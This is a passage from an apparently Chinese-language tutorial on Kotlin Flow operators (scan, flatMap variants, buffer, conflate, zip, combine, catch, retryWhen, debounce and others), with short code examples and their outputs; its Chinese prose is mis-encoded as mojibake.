<p><em>ä¸­é—´æ“ä½œç¬¦ä¸ä¼šè§¦å‘ <code>Flow</code> çš„æ”¶é›†ï¼Œæ‰€ä»¥éœ€è¦ <code>collect</code> è§¦å‘ <code>Flow</code> çš„æ”¶é›†ï¼Œè€Œ <code>reduce</code> è¿™ç§ç»ˆç«¯æ“ä½œç¬¦ä¼šè§¦å‘ <code>Flow</code> çš„æ”¶é›†ã€‚</em></p>
<p><code>scan</code> æ˜¯æ›´é€šç”¨çš„ç‰ˆæœ¬ï¼Œæ”¯æŒæŒ‡å®šåˆå§‹ç§å­å€¼ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"runningReduce:"</span>)
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .runningReduce { accumulator, value -&gt; accumulator + value }
        .collect { println(it) } 

    println(<span class="hljs-string">"scan:"</span>)
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .scan(<span class="hljs-number">0</span>) { accumulator, value -&gt; accumulator + value }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// runningReduce:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// 6</span>
<span class="hljs-comment">// scan:</span>
<span class="hljs-comment">// 0</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// 6</span>
</code></pre>
<p>æ³¨æ„ï¼šä»–ä»¬ä¼šè¿”å›æ¯ä¸€æ­¥çš„ç»“æœï¼Œè€Œ <code>reduce</code>/<code>fold</code> åªè¿”å›æœ€ç»ˆç»“æœã€‚</p>
<p>é€‚ç”¨åœºæ™¯ï¼šè®¡ç®—ç´¯è®¡æ€»å’Œã€è·Ÿè¸ªè¿›åº¦ï¼Œæˆ–åœ¨çŠ¶æ€æœºä¸­å±•ç¤ºçŠ¶æ€å†å²ã€‚</p>
<hr/>
<h2 data-id="heading-8">å‘å‡ºå¤šä¸ªå€¼</h2>
<h3 data-id="heading-9">transform</h3>
<p>é«˜åº¦çµæ´»çš„æ“ä½œç¬¦ï¼Œå¯ä¸ºæ¯ä¸ªè¾“å…¥å…ƒç´ å‘å‡ºé›¶ä¸ªã€ä¸€ä¸ªæˆ–å¤šä¸ªå€¼ï¼Œå¯¹è¾“å‡ºæµæœ‰æ›´å¼ºæ§åˆ¶åŠ›ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.2</span>).asFlow()
        .transform {
            emit(<span class="hljs-string">"Item: <span class="hljs-variable">$it</span>"</span>)
            <span class="hljs-keyword">if</span> (it % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) {
                emit(<span class="hljs-string">"...is an odd number"</span>)
            }
            emit(<span class="hljs-string">"Square: <span class="hljs-subst">${it * it}</span>"</span>)
        }.collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Item: 1</span>
<span class="hljs-comment">// ...is an odd number</span>
<span class="hljs-comment">// Square: 1</span>
<span class="hljs-comment">// Item: 2</span>
<span class="hljs-comment">// Square: 4</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šæ‰§è¡Œå¤æ‚è½¬æ¢ã€å¼•å…¥å‰¯ä½œç”¨ï¼ˆå¦‚æ—¥å¿—è®°å½•ï¼‰ï¼Œæˆ–æ ¹æ®å•ä¸ªè¾“å…¥æœ‰æ¡ä»¶åœ°å‘å‡ºå¤šä¸ªå€¼ã€‚</p>
<hr/>
<h2 data-id="heading-10">æ‰å¹³åŒ–åµŒå¥—</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b154009cd2e4d66b4c5014e5ae8641e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=MxLI8kVIGB3BJ5Zg4Ln7RIwwYns%3D" alt="4.png" loading="lazy"/></p>
<h3 data-id="heading-11">flatMapConcat</h3>
<p>å°†æ¯ä¸ªå…ƒç´ è½¬æ¢ä¸ºä¸€ä¸ª <code>Flow</code>ï¼Œç„¶åä¾æ¬¡è¿æ¥è¿™äº› <code>Flow</code>ï¼Œåªæœ‰å½“å‰ä¸€ä¸ª <code>Flow</code> å®Œæˆåï¼Œä¸‹ä¸€ä¸ªæ‰å¼€å§‹ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getNumbersFlow</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: Flow&lt;String&gt; = flow {
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"First-<span class="hljs-variable">$id</span>"</span>)
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"Second-<span class="hljs-variable">$id</span>"</span>)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.2</span>).asFlow().flatMapConcat { id -&gt; getNumbersFlow(id) }.collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// First-1</span>
<span class="hljs-comment">// Second-1</span>
<span class="hljs-comment">// First-2</span>
<span class="hljs-comment">// Second-2</span>
</code></pre>
<p><em>ä»”ç»†çœ‹ï¼Œç¬¬ä¸€ä¸ªæµçš„æ¯ä¸ªæ•°å­—éƒ½ä¼šå‚ä¸åˆ°ç¬¬äºŒä¸ªæµä¸­ã€‚</em></p>
<p>é€‚ç”¨åœºæ™¯ï¼šé¡ºåºæ•æ„Ÿçš„æ“ä½œï¼Œä¾‹å¦‚ä¾æ¬¡ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ï¼Œæˆ–æ‰§è¡Œä¾èµ–å‹ç½‘ç»œè¯·æ±‚ã€‚</p>
<h3 data-id="heading-12">flatMapMerge</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4254fe85b6c142c687e6a790fa6c97a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=o%2FW51%2FAQwiZtZ0aXVrUeQpyxh94%3D" alt="1.png" loading="lazy"/></p>
<p>å¹¶å‘åˆå¹¶ç”±è½¬æ¢å‡½æ•°ç”Ÿæˆçš„å¤šä¸ª <code>Flow</code>ï¼Œå¯é€šè¿‡ <code>concurrency</code> å‚æ•°æ§åˆ¶å¹¶å‘æ•°é‡ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getNumbersFlow</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: Flow&lt;String&gt; = flow {
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"First-<span class="hljs-variable">$id</span>"</span>)
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"Second-<span class="hljs-variable">$id</span>"</span>)
}

<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.2</span>).asFlow()
        .flatMapMerge { id -&gt; getNumbersFlow(id) }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// First-1</span>
<span class="hljs-comment">// First-2</span>
<span class="hljs-comment">// Second-2</span>
<span class="hljs-comment">// Second-1</span>
</code></pre>
<p>ä»ç»“æœä¸Šæ³¨æ„åŒºåˆ† <code>flatMapConcat</code>ï¼Œ<code>flatMapMerge</code> ä¸ä¼šä¿è¯åˆå¹¶çš„é¡ºåºã€‚</p>
<p>é€‚ç”¨åœºæ™¯ï¼šé¡ºåºæ— å…³çš„å¹¶è¡Œæ“ä½œï¼Œä¾‹å¦‚åŒæ—¶ä»å¤šä¸ªæ•°æ®æºè·å–æ•°æ®ã€‚</p>
<h3 data-id="heading-13">flatMapLatest</h3>
<p>å½“æ–°å…ƒç´ å‘å‡ºæ—¶ï¼Œç«‹å³å–æ¶ˆä¸Šä¸€ä¸ªå…ƒç´ å¯¹åº”çš„ <code>Flow</code>ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">val</span> searchQuery = flowOf(<span class="hljs-string">"search"</span>, <span class="hljs-string">"search with new term"</span>).onEach { delay(<span class="hljs-number">200</span>) }

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">searchApi</span><span class="hljs-params">(query: <span class="hljs-type">String</span>)</span></span>: Flow&lt;String&gt; = flow {
    emit(<span class="hljs-string">"Searching for '<span class="hljs-variable">$query</span>'..."</span>)
    delay(<span class="hljs-number">500</span>) <span class="hljs-comment">// æ¨¡æ‹Ÿç½‘ç»œå»¶è¿Ÿ</span>
    emit(<span class="hljs-string">"Results for '<span class="hljs-variable">$query</span>'"</span>)
}

<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    searchQuery
        .flatMapLatest { query -&gt; searchApi(query) }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Searching for 'search'...</span>
<span class="hljs-comment">// Searching for 'search with new term'...</span>
<span class="hljs-comment">// Results for 'search with new term'</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šå®æ—¶æœç´¢åŠŸèƒ½ï¼Œæˆ–ä»»ä½•åªéœ€å…³æ³¨æœ€æ–°äº‹ä»¶ç»“æœçš„åœºæ™¯ã€‚</p>
<hr/>
<h2 data-id="heading-14">ä¸Šä¸‹æ–‡ä¸ç¼“å†²</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce7e6dce687947efa5a9c0ff702537f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=Una%2BLIFuOR1cwRS6q6ZRLj2aj28%3D" alt="5.png" loading="lazy"/></p>
<h3 data-id="heading-15">flowOn</h3>
<p>æ›´æ”¹ç”¨äºæ‰§è¡Œä¸Šæ¸¸ <code>Flow</code> çš„ <code>CoroutineContext</code>ï¼Œæ˜¯ <code>Flow</code> ä¸­åˆ‡æ¢è°ƒåº¦å™¨çš„æ­£ç¡®æ–¹å¼ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">heavyWork</span><span class="hljs-params">()</span></span>: Flow&lt;<span class="hljs-built_in">Int</span>&gt; = flow {
    println(<span class="hljs-string">"Starting heavy work on <span class="hljs-subst">${Thread.currentThread().name}</span>"</span>)
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.3</span>) {
        <span class="hljs-comment">// Simulate CPU-intensive work</span>
        Thread.sleep(<span class="hljs-number">100</span>)
        emit(i)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    heavyWork()
        .flowOn(Dispatchers.IO) <span class="hljs-comment">// Upstream runs on IO dispatcher</span>
        .collect {
            println(<span class="hljs-string">"Collected <span class="hljs-variable">$it</span> on <span class="hljs-subst">${Thread.currentThread().name}</span>"</span>)
        }
    <span class="hljs-comment">// Downstream runs on the collector's context (e.g., Main)</span>
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Starting heavy work on DefaultDispatcher-worker-1</span>
<span class="hljs-comment">// Collected 1 on main</span>
<span class="hljs-comment">// Collected 2 on main</span>
<span class="hljs-comment">// Collected 3 on main</span>
</code></pre>
<h3 data-id="heading-16">buffer</h3>
<p>é€šè¿‡è§£è€¦ç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…å®ç°å¹¶å‘æ‰§è¡Œï¼šç”Ÿäº§è€…å°†é¡¹æ”¾å…¥ç¼“å†²åŒºï¼Œæ¶ˆè´¹è€…ä»ä¸­å–å‡ºã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> time = measureTimeMillis {
        flow {
            <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.3</span>) {
                delay(<span class="hljs-number">200</span>) <span class="hljs-comment">// Simulate slow emission</span>
                emit(i)
            }
        }
        .buffer() <span class="hljs-comment">// With buffer, the total time is closer to the slow collector's time</span>
        .collect {
            delay(<span class="hljs-number">300</span>) <span class="hljs-comment">// Simulate slow collection</span>
            println(it)
        }
    }
    println(<span class="hljs-string">"Collected in <span class="hljs-variable">$time</span> ms"</span>)
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// Collected in 1172 ms</span>
</code></pre>
<p>å¾—ç›Šäº <code>buffer</code>ï¼Œæœ€åæ•´ä¸ªæ•°æ®çš„æ”¶é›†æ—¶é—´è¦å°äº <code>(200 + 300) * 3</code>ã€‚</p>
<p>ä½¿ç”¨åœºæ™¯ï¼šå½“ç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…å¤„ç†é€Ÿåº¦ä¸ä¸€è‡´æ—¶ï¼Œæå‡æ€§èƒ½ã€‚</p>
<h3 data-id="heading-17">conflate</h3>
<p>ä¸€ç§ç¼“å†²å½¢å¼ï¼Œå½“æ”¶é›†å™¨å¤„ç†å¤ªæ…¢æ—¶ä¼šä¸¢å¼ƒä¸­é—´å€¼ï¼Œç¡®ä¿å§‹ç»ˆè·å–æœ€æ–°å€¼ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flow {
        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.5</span>) {
            delay(<span class="hljs-number">100</span>)
            emit(i)
        }
    }
    .conflate()
    .collect { value -&gt;
        println(<span class="hljs-string">"Started processing <span class="hljs-variable">$value</span>"</span>)
        delay(<span class="hljs-number">300</span>)
        println(<span class="hljs-string">"Finished processing <span class="hljs-variable">$value</span>"</span>)
    }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Started processing 1</span>
<span class="hljs-comment">// Finished processing 1</span>
<span class="hljs-comment">// Started processing 3</span>
<span class="hljs-comment">// Finished processing 3</span>
<span class="hljs-comment">// Started processing 5</span>
<span class="hljs-comment">// Finished processing 5</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šUI æ›´æ–°ä¸­æ— éœ€æ˜¾ç¤ºä¸­é—´çŠ¶æ€ï¼Œå¦‚è‚¡ç¥¨è¡Œæƒ…æˆ– GPS ä½ç½®æ›´æ–°ã€‚</p>
<h3 data-id="heading-18">collectLatest</h3>
<p>ç»ˆç«¯æ“ä½œç¬¦ï¼Œå½“æ–°å€¼å‘å‡ºæ—¶ï¼Œå–æ¶ˆå¯¹å‰ä¸€ä¸ªå€¼çš„æ”¶é›†é€»è¾‘ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .onEach { delay(<span class="hljs-number">100</span>) }
        .collectLatest { value -&gt;
            println(<span class="hljs-string">"Collecting <span class="hljs-variable">$value</span>"</span>)
            delay(<span class="hljs-number">300</span>)
            println(<span class="hljs-string">"Finished collecting <span class="hljs-variable">$value</span>"</span>)
        }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Collecting 1</span>
<span class="hljs-comment">// Collecting 2</span>
<span class="hljs-comment">// Collecting 3</span>
<span class="hljs-comment">// Finished collecting 3</span>
</code></pre>
<p><em>æ³¨æ„çœ‹è¿™é‡Œçš„ç»“æœï¼ŒFinished collecting åªæ”¶é›†äº†æœ€åä¸€æ¬¡çš„å€¼ï¼Œä¸€å®šè¦æ³¨æ„è¿™ä¸ªç‰¹æ€§ã€‚</em></p>
<p>é€‚ç”¨åœºæ™¯ï¼šæŸé¡¹æ“ä½œè€—æ—¶è¾ƒé•¿ï¼Œä¸”åº”åœ¨æ–°é¡¹åˆ°è¾¾æ—¶è¢«å–æ¶ˆï¼Œä¾‹å¦‚å°†ç”¨æˆ·è¾“å…¥ä¿å­˜åˆ°æ•°æ®åº“ã€‚</p>
<hr/>
<h2 data-id="heading-19">åˆå¹¶</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/debdb8739b2a4d94b5ac4348155e0fb9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=7%2B6T%2FLUhSUM1fiRI0Bihj%2Bxro4c%3D" alt="6.png" loading="lazy"/></p>
<h3 data-id="heading-20">zip</h3>
<p>ç­‰å¾…ä¸¤ä¸ª <code>Flow</code> å„è‡ªå‘å‡ºä¸€é¡¹åè¿›è¡Œç»„åˆã€‚ä»»ä¸€æº <code>Flow</code> ç»“æŸï¼Œç»“æœ <code>Flow</code> å³ç»“æŸã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> flowA = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
    <span class="hljs-keyword">val</span> flowB = flowOf(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>, <span class="hljs-string">"D"</span>)

    flowA.zip(flowB) { number, letter -&gt; <span class="hljs-string">"<span class="hljs-variable">$number</span><span class="hljs-variable">$letter</span>"</span> }
        .collect { println(it) } 
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1A</span>
<span class="hljs-comment">// 2B</span>
<span class="hljs-comment">// 3C</span>
</code></pre>
<h3 data-id="heading-21">combine</h3>
<p>ç»„åˆä¸¤ä¸ª <code>Flow</code> çš„æœ€æ–°å€¼ã€‚åªè¦ä»»ä¸€æº <code>Flow</code> å‘å‡ºæ–°å€¼ï¼ˆä¸”åŒæ–¹è‡³å°‘å„å‘å‡ºè¿‡ä¸€æ¬¡ï¼‰ï¼Œå°±ä¼šè§¦å‘ä¸€æ¬¡å‘å°„ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> flowA = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow().onEach { delay(<span class="hljs-number">100</span>) }
    <span class="hljs-keyword">val</span> flowB = flowOf(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>).onEach { delay(<span class="hljs-number">150</span>) }

    flowA.combine(flowB) { number, letter -&gt; <span class="hljs-string">"<span class="hljs-variable">$number</span><span class="hljs-variable">$letter</span>"</span> }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1A</span>
<span class="hljs-comment">// 2A</span>
<span class="hljs-comment">// 3A</span>
<span class="hljs-comment">// 3B</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šå“åº”å¤šä¸ªæ•°æ®æºçš„å˜åŒ–ã€‚</p>
<h3 data-id="heading-22">merge</h3>
<p>å°†å¤šä¸ª <code>Flow</code> åˆå¹¶ä¸ºä¸€ä¸ªï¼ŒæŒ‰å‘å‡ºé¡ºåºäº¤é”™è¾“å‡ºæ‰€æœ‰å€¼ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> flowA = flowOf(<span class="hljs-string">"A1"</span>, <span class="hljs-string">"A2"</span>).onEach { delay(<span class="hljs-number">100</span>) }
    <span class="hljs-keyword">val</span> flowB = flowOf(<span class="hljs-string">"B1"</span>, <span class="hljs-string">"B2"</span>).onEach { delay(<span class="hljs-number">50</span>) }

    merge(flowA, flowB)
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// B1</span>
<span class="hljs-comment">// A1</span>
<span class="hljs-comment">// B2</span>
<span class="hljs-comment">// A2</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šå°†æ¥è‡ªä¸åŒ UI ç»„ä»¶çš„å¤šä¸ªäº‹ä»¶æµåˆå¹¶ä¸ºå•ä¸€å¤„ç†æµã€‚</p>
<hr/>
<h2 data-id="heading-23">é”™è¯¯ä¸å®Œæˆå¤„ç†</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95682e5dd75b4e80af39a6f3fb05b9cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=xwKucKREDlNVuyFwOpiP%2B7lj1lc%3D" alt="7.png" loading="lazy"/></p>
<h3 data-id="heading-24">catch</h3>
<p>æ•è·ä¸Šæ¸¸ <code>Flow</code>ï¼ˆå³ <code>catch</code> ä¹‹å‰çš„æ“ä½œç¬¦ï¼‰ä¸­å‘ç”Ÿçš„å¼‚å¸¸ï¼Œä½†ä¸æ•è·ä¸‹æ¸¸æ”¶é›†å™¨ä¸­çš„å¼‚å¸¸ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flow {
        emit(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Error!"</span>)
    }
    .<span class="hljs-keyword">catch</span> { e -&gt;
        println(<span class="hljs-string">"Caught: <span class="hljs-subst">${e.message}</span>"</span>)
        emit(-<span class="hljs-number">1</span>) <span class="hljs-comment">// Emit a fallback value</span>
    }
    .collect { println(it) } <span class="hljs-comment">// Emits 1, then -1</span>
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// Caught: Error!</span>
<span class="hljs-comment">// -1</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šä¼˜é›…åœ°å¤„ç†é”™è¯¯ã€æä¾›é»˜è®¤å€¼æˆ–è®°å½•å¤±è´¥ä¿¡æ¯ã€‚</p>
<h3 data-id="heading-25">onCompletion</h3>
<p>åœ¨ <code>Flow</code> å®Œæˆæ—¶ï¼ˆæ— è®ºæˆåŠŸæˆ–å¼‚å¸¸ï¼‰æ‰§è¡ŒæŒ‡å®šæ“ä½œã€‚æˆåŠŸæ—¶ <code>cause</code> ä¸º <code>null</code>ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .onCompletion { cause -&gt;
            <span class="hljs-keyword">if</span> (cause != <span class="hljs-literal">null</span>) println(<span class="hljs-string">"Flow completed with error"</span>)
            <span class="hljs-keyword">else</span> println(<span class="hljs-string">"Flow completed successfully"</span>)
        }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// Flow completed successfully</span>
</code></pre>
<h3 data-id="heading-26">retryWhen</h3>
<p>åœ¨å‘ç”Ÿå¼‚å¸¸æ—¶æ ¹æ®è°“è¯ï¼ˆåŒ…å«å¼‚å¸¸åŸå› å’Œé‡è¯•æ¬¡æ•°ï¼‰å†³å®šæ˜¯å¦é‡è¯•ã€‚</p>
<pre><code class="hljs language-scss" lang="scss">suspend fun <span class="hljs-selector-tag">main</span>() {
    <span class="hljs-selector-tag">var</span> attemptCount = <span class="hljs-number">0</span>
    <span class="hljs-attribute">flow</span> {
        <span class="hljs-built_in">emit</span>(<span class="hljs-number">1</span>)
        if (attemptCount &lt; <span class="hljs-number">2</span>) {
            attemptCount++
            throw <span class="hljs-built_in">RuntimeException</span>("Transient error")
        }
        <span class="hljs-built_in">emit</span>(<span class="hljs-number">2</span>)
    }
    <span class="hljs-selector-class">.retryWhen</span> { cause, attempt -&gt;
        <span class="hljs-built_in">println</span>("Attempt $attempt: Retrying due to ${cause.message}")
        <span class="hljs-built_in">delay</span>(<span class="hljs-number">100</span>) <span class="hljs-comment">// Add a delay before retrying</span>
        attempt &lt; <span class="hljs-number">2</span> <span class="hljs-comment">// Retry up to 2 times</span>
    }
    <span class="hljs-selector-class">.catch</span> { <span class="hljs-built_in">println</span>("Caught final error: ${it.message}") }
    <span class="hljs-selector-class">.collect</span> { <span class="hljs-built_in">println</span>(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// Attempt 0: Retrying due to Transient error</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// Attempt 1: Retrying due to Transient error</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
</code></pre>
<p><code>retryWhen</code> çš„å›è°ƒæœ‰ä¸¤ä¸ªå‚æ•°ï¼š</p>
<ul>
<li><code>cause</code>ï¼šå¯¼è‡´ <code>Flow</code> å¤±è´¥çš„å¼‚å¸¸ï¼ˆ<code>Throwable</code>Â ç±»å‹ï¼‰ã€‚</li>
<li><code>attempt</code>ï¼šå½“å‰æ˜¯ç¬¬å‡ æ¬¡é‡è¯•ï¼Œä»Â <code>0</code>Â å¼€å§‹è®¡æ•°ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-27">å·¥å…·ä¸å‰¯ä½œç”¨</h2>
<h3 data-id="heading-28">onEach</h3>
<p>å¯¹ <code>Flow</code> ä¸­æ¯ä¸ªå…ƒç´ æ‰§è¡ŒæŒ‡å®šæ“ä½œï¼Œä½†ä¸ä¿®æ”¹å…ƒç´ æœ¬èº«ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .onEach { println(<span class="hljs-string">"About to process <span class="hljs-variable">$it</span>"</span>) }
        .map { it * it }
        .collect { println(<span class="hljs-string">"Processed value: <span class="hljs-variable">$it</span>"</span>) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// About to process 1</span>
<span class="hljs-comment">// Processed value: 1</span>
<span class="hljs-comment">// About to process 2</span>
<span class="hljs-comment">// Processed value: 4</span>
<span class="hljs-comment">// About to process 3</span>
<span class="hljs-comment">// Processed value: 9</span>
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼šç”¨äºæ—¥å¿—ã€è°ƒè¯•æˆ–åŸ‹ç‚¹ç­‰å‰¯ä½œç”¨åœºæ™¯ï¼Œåœ¨ä¸æ”¹å˜æ•°æ®çš„å‰æä¸‹è§‚å¯Ÿ <code>Flow</code>ã€‚</p>
<h3 data-id="heading-29">debounce</h3>
<p>è¿‡æ»¤åœ¨æŒ‡å®šè¶…æ—¶å†…è¢«æ–°å€¼å–ä»£çš„å€¼ï¼Œä»…å‘å‡ºâ€œçªå‘â€ä¸­çš„æœ€åä¸€ä¸ªå€¼ã€‚</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flow {
        emit(<span class="hljs-number">1</span>)
        delay(<span class="hljs-number">90</span>)
        emit(<span class="hljs-number">2</span>)
        delay(<span class="hljs-number">90</span>)
        emit(<span class="hljs-number">3</span>)
        delay(<span class="hljs-number">500</span>)
        emit(<span class="hljs-number">4</span>)
        delay(<span class="hljs-number">90</span>)
        emit(<span class="hljs-number">5</span>)
    }.debounce(<span class="hljs-number">100</span>).collect { println(it) } 
}
